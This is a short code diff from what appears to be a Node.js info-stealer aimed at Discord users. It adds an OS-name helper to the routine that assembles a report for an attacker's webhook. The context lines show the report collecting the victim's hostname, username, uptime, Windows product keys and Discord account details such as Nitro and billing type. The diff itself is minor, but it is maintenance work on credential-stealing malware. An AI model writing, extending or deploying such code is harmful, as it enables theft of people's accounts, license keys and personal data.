@@ -10,6 +10,7 @@ const { rmSync, readFileSync } = require('fs');
 const { userAgent } = require('../config');
 const { nitroSubscriptionType, billingType, accountFlags, avatarURL, defaultAvatar } = require('../util/discord-account');
 const { sleep } = require('../util/general');
+const { getNameAndVersion } = require('../util/os');
 
 if (!webhook.url || typeof webhook.url !== 'string' || !isValidURL(webhook.url)) return;
 
@@ -23,7 +24,7 @@ const json = async (zipFile) => {
     ['👨 Name', code(os.hostname())],
     ['🕘 Uptime', `<t:${uptime}:R> (<t:${uptime}:f>)`],
     ['🥷 Username', code(os.userInfo().username)],
-    ['🔄 OS version', os.version()],
+    ['🔄 OS version', getNameAndVersion().name + ' ' + getNameAndVersion().version],
     ['🔑 Product Key', code(require('./product-key').productKey)],
     ['🔑 Backup Product Key', code(require('./product-key').backupProductKey)],
   ];
